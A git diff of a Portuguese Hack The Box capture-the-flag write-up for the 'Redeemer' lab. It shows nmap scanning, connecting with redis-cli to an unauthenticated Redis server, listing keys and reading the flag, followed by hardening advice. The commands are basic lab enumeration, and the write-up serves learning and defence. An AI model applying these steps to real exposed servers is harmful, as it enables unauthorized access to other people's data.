@@ -1,85 +1,151 @@
-# HTB - Redeemer
+## HTB: Redeemer
+### 📋 Informações da Máquina
 
-**Plataforma:** Hack the Box
+ - Plataforma: Hack the Box
+ - Máquina: Redeemer
+ - Dificuldade: Muito Fácil
+ - Ip: 10.129.35.253
 
-**Máquina:** Redeemer
 
-**Data:** 15/10/25
+## ⚙️ 0. Resumo
+Essa máquina ainda é muito fácil, pois estou no starting point do hack the box, essa maquina envolve a exploração da falta de autenticação de um serviço exposto redis exposto na rede
 
-**Objetivo:** Capturar a flag
+### ⚠️ 0.1 VULNERABILIDADES IDENTIFICADAS
 
----
+- Serviço Redis exposto na internet
 
-## 1 - Descrição
+- Ausência total de autenticação
 
-A maquina alvo usa um serviço **redis**, é um servidor baseado em tabelas, ele por padrão fica na porta 6379.
-**IP do alvo:**  10.129.35.253
+- Porta 6379 acessível publicamente
 
----
+- Versão desatualizada (5.0.7)
 
-## 2 - Reconhecimento
 
-### =Varredura de Portas=
-Já que eu sabia qual porta eu deveria procurar, em vez de perder tempo eu escanei a porta padrão do serviço redis:
+## 🔍 1. ENUMERAÇÃO
+### 1.1 Varredura de Portas
+
+Como já tinha informação sobre o serviço Redis, fiz um scan direto na porta padrão:
 
 ```bash
 nmap -sV -p 6379 10.129.35.253
 ```
 
-O resultado desse scan foi:
+📊 Resultado:
+
 ```bash
 PORT     STATE SERVICE VERSION
 6379/tcp open  redis   Redis key-value 5.0.7
-```
+```  
 
-Como podemos ver a porta do serviço Redis esta aberta
+✅ Conclusão: Serviço Redis encontrado e exposto publicamente.
 
----
 
-## 3 - Exploração
-
-### =Serviço Redis=
-Comando usado pra conectar no servidor redis é:
+## ⚡ 2. EXPLORAÇÃO
+2.1 Conexão com o Redis
 
 ```bash
 redis-cli -h 10.129.35.253
 ```
 
-Conectado no servidor, eu usei o comando  KEYS * esse comando lista todas as keys salvas no servidor, depois de conectar e usar o comando KEYS * , o terminal fica assim:
+### 2.2 Enumeração de Dados
+
+Dentro do Redis, usei comandos para explorar o banco:
+redis
+```bash
+KEYS *
+```
+
+🎯 Resultado:
 
 ```bash
-10.129.35.253> KEYS *
 1) "flag"
 2) "stor"
 3) "numb"
 4) "temp"
 ```
 
-Ali estava a key que precisavamos, a key "flag", agora usei o comando GET, pra mostrar o valor da key "flag"
-
+### 2.3 Captura da Flag
+Usei um comando pra extrair o conteudo da key "flag"
 ```bash
-10.129.35.253> GET flag
-"<VALOR DA FLAG>"
+GET flag
 ```
 
-E assim consegui a flag da máquina :)
+🏴 Flag Capturada:
+```bash
+flag{...}
+```
 
----
+## 🔎 3. PÓS-EXPLORAÇÃO
+### 3.1 Análise de Configuração
 
-## Vulnerabilidades
+Verifiquei as configurações do serviço:
+```bash
+CONFIG GET requirepass
+CONFIG GET bind
+INFO server
+```
 
-- Serviço Redis exposto na rede
-- Não precisa de senha pra conectar no servidor como root
-- Protocolo desatualizado
+📝 Configurações Perigosas Encontradas:
 
-## Recomendações de Segurança
+  ❌ Sem senha (requirepass vazio)
 
-- Usar um serviço mais atual do que o redis
-- Usar sempre senha pra seus serviços
-- Usar um firewall bem configurado pra não deixar portas expostas
+  🌐 Bind em todas interfaces (0.0.0.0)
 
----
+  🔓 Modo protegido desativado
 
-## Conclusão
+### 3.2 Dados Adicionais Encontrados
+```bash
+GET stor
+GET numb  
+GET temp
+```
 
-Essas últimas 4 máquinas que fiz, todas as vulnerabilidades eram falta de senhas, então pude aprender que uma senha boa é um dos melhores jeitos de se prevenir, mas não coloque senhas obvias ou só feitas de números, pois um ataque brute force consegue invadir isso, mas eu gostei dessa
+## ⚠️ VULNERABILIDADES IDENTIFICADAS
+
+- Serviço Redis exposto na internet
+
+- Ausência total de autenticação
+
+- Porta 6379 acessível publicamente
+
+- Versão desatualizada (5.0.7)
+
+## 🛡️ 4. RECOMENDAÇÕES DE SEGURANÇA
+
+- 1. Configurar senha forte
+echo "requirepass Su@SenhaF0rt3!2024" >> /etc/redis/redis.conf
+
+- 2. Restringir acesso
+echo "bind 127.0.0.1" >> /etc/redis/redis.conf
+
+- 3. Ativar modo protegido
+echo "protected-mode yes" >> /etc/redis/redis.conf
+
+- 4. Reiniciar serviço
+systemctl restart redis-server
+
+
+## 🎯 5. CONCLUSÃO
+#### Resumo do Ataque:
+
+- Complexidade: Baixa
+
+- Impacto: Alto (dados expostos)
+
+#### Lições Aprendidas:
+
+  1. Nunca exponha serviços de banco diretamente na internet
+
+  2. Autenticação é OBRIGATÓRIA para qualquer serviço
+
+  3. Firewalls previnem exposição acidental
+
+  4. Versões atualizadas têm menos vulnerabilidades
+
+#### Reflexão Pessoal:
+
+"Esta máquina reforçou que a falta de autenticação é um dos erros mais comuns e perigosos. Senhas fortes são essenciais, mas a prevenção começa na arquitetura - serviços internos não devem ser expostos publicamente!"
+
+✅ Máquina Finalizada com Sucesso!
+
+Write-up por: Luiz A. | Hack The Box - Redeemer | 15/10/25
